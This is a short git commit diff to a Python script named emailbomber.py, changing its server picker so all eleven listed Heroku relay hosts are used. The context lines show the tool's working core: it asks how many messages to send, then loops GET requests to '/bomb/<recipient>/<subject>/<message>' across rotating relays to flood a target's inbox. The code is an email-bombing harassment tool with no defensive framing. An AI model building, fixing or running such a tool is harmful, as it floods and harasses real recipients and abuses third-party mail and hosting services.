2db330041faa6b1e16ade9cc45d06844a78be0cd
bagarrattaa <apple.macos.ios.6@gmail.com>
2022-02-20 22:36:27 +0530

    fix

--- emailbomber.py
+++ emailbomber.py
@@ -10,7 +10,7 @@ sub=sub.replace(" ","%20")
 srvrlist={1:"https://emailbomber-1.herokuapp.com",2:"https://emailbomber-2.herokuapp.com",3:"https://emailbomber-3.herokuapp.com",4:"https://emailbomber-4.herokuapp.com",5:"https://emailbomber-5.herokuapp.com",6:"https://emailbomber-6.herokuapp.com",7:"https://emailbomber-7.herokuapp.com",8:"https://emailbomber-8.herokuapp.com",9:"https://emailbomber-9.herokuapp.com",10:"https://emailbomber-10.herokuapp.com",11:"https://emailbomber-11.herokuapp.com"}
 am=int(input("enter amount of msgs to send"))
 for i in range(0,am): 
-    srvr=random.randint(1,10)
+    srvr=random.randint(1,11)
     req=requests.get(srvrlist.get(srvr)+"/bomb/"+to+"/"+sub+"/"+msg)
     if req.text=="Sent": 
         print (i+1)
